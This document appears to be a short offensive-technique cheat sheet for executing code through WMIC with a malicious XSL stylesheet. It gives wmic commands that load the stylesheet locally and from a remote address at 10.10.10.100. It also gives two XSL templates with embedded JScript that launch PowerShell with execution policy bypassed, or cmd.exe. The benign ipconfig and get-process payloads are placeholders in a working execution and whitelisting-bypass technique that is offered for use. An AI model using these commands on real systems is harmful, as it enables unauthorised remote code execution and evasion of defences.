
## WMIC

```powershell
wmic os get /format:"Execute.xsl"
wmic os get version /format:"http://10.10.10.100:80/Execute.xsl"
```

```
<?xml version='1.0'?>
<stylesheet version="1.0"
    xmlns="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="http://Security.local/Endpoint">
    <output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell");
            var psCommand = "powershell.exe -ExecutionPolicy Bypass -NoExit -Command get-process ; ipconfig";
            r.Run(psCommand);
        ]]>
    </ms:script>
</stylesheet>
```
```
<?xml version='1.0'?>
<stylesheet version="1.0"
    xmlns="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="http://Security.local/Endpoint">
    <output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell");
            var Command = "cmd.exe /k ipconfig";
            r.Run(Command);
        ]]>
    </ms:script>
</stylesheet>
```
